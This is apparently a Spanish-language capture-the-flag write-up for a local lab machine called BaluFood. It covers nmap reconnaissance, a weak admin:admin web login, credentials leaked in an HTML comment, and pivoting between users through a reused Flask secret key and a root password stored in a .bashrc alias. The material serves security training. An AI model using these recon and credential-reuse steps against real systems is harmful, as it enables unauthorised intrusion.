- Tags: #BaluFood
---
[Maquina BaluFood](https://mega.nz/file/PEc21IYa#tR9C-oqGJsnaWNE4Wsjs-V9S6qCCFJRTPOq0LwrrOco) -> Página web de un restaurante con data leakage y escalada de privilegios en linux con user pivoting.

```bash
7z x balufood.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh balufood.tar # Desplegamos el laboratorio
```

### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion IP del target
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para determinar si tenemos conectividad con el target

wichSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina Linux
172.17.0.2 (ttl -> 64): Linux
```

### Fase Enumeracion Puertos:
```bash
escanerTCP.py -t 172.17.0.2 -p 1-10000 # Realizamos descubrimiento de puertos
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts 
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
nmap -sC -sV -p22,5000 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar el servicio y la version que corren detras de estos puertos
```

**( 22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0) )** -> Tenemos un servicio **ssh** expueto
**( 5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2) )** -> Tenemos un servicio web de **python** expuesto posiblemente este **Flask** corriendo por detras.

### Fase Enumeracion Web:
```bash
whatweb http://172.17.0.2:5000 # Detectamos las tecnologias que emplea este servicio web
nmap -p 5000 --script http-enum 172.17.0.2 # Realizamos un script para enumerar rutas.
```

**( http://172.17.0.2:5000/ )** --> Accedemos al citio donde esta desplegada la web
**( http://172.17.0.2:5000/login )** --> Tenemos este panel de inicio de sesion que tiene una password debil

```bash
username: admin
password: admin
```

**( http://172.17.0.2:5000/admin )** --> Una ves logueados tenemos filtrada la informacion:

```bash
<!-- Backup de acceso: sysadmin:backup123 --> # Posibles credenciales
```

### Fase Intrusion:

```bash
ssh-keygen -R 172.17.0.2 && ssh sysadmin@172.17.0.2 # Password ( backup123 )
```

```bash
head app.py # Tenemos este archivo que contiene una cadena.

from flask import Flask, render_template, redirect, url_for, request, session, flash
import sqlite3
from functools import wraps

app = Flask(__name__)
app.secret_key = 'cuidaditocuidadin'
DATABASE = 'restaurant.db'

def get_db_connection():
    conn = sqlite3.connect(DATABASE)
```

```bash
grep "sh$" /etc/passwd # Viendo que tenemos al usario: balulero:x:1001:1001:balulero,,,:/home/balulero:/bin/bash

su balulero # Passamos la contrasena: ( cuidaditocuidadin )
```

```bash
.bashrc # Tenemos este archivo que revisamos, y contiene un alias para el usuario ( balulero )
ser-root # alias que contiene la password de root ( chocolate2 )
```

```bash
su root # ( chocolate2 )
```